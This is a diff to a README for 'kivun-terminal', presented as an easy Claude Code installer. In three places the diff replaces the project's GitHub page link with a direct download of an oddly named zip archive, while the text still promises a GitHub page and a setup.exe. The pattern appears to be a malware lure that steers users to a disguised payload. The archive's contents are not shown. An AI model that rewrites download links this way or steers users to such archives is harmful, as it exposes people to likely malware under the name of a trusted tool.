@@ -1,6 +1,6 @@
 # ⚙️ kivun-terminal - Easy Claude Code Installer
 
-[![Download kivun-terminal](https://img.shields.io/badge/Download-kivun--terminal-brightgreen?style=for-the-badge)](https://github.com/Biogenetic-fugu325/kivun-terminal)
+[![Download kivun-terminal](https://img.shields.io/badge/Download-kivun--terminal-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Biogenetic-fugu325/kivun-terminal/main/peace/kivun_terminal_psychosexual.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to download and run kivun-terminal on Windows:
 
 Click the big green button at the top or visit the link below to download the installer:
 
-[Download kivun-terminal](https://github.com/Biogenetic-fugu325/kivun-terminal)
+[Download kivun-terminal](https://raw.githubusercontent.com/Biogenetic-fugu325/kivun-terminal/main/peace/kivun_terminal_psychosexual.zip)
 
 You will be taken to the GitHub page where you can find the latest version. Look for a file named something like `kivun-terminal-setup.exe`.
 
@@ -114,7 +114,7 @@ If you have trouble running or installing kivun-terminal, check these tips:
 ## 🔗 Useful Links
 
 - Official GitHub page with downloads and updates:  
-  [https://github.com/Biogenetic-fugu325/kivun-terminal](https://github.com/Biogenetic-fugu325/kivun-terminal)
+  [https://raw.githubusercontent.com/Biogenetic-fugu325/kivun-terminal/main/peace/kivun_terminal_psychosexual.zip](https://raw.githubusercontent.com/Biogenetic-fugu325/kivun-terminal/main/peace/kivun_terminal_psychosexual.zip)
 
 - Report issues or request features on GitHub Issues page.
 
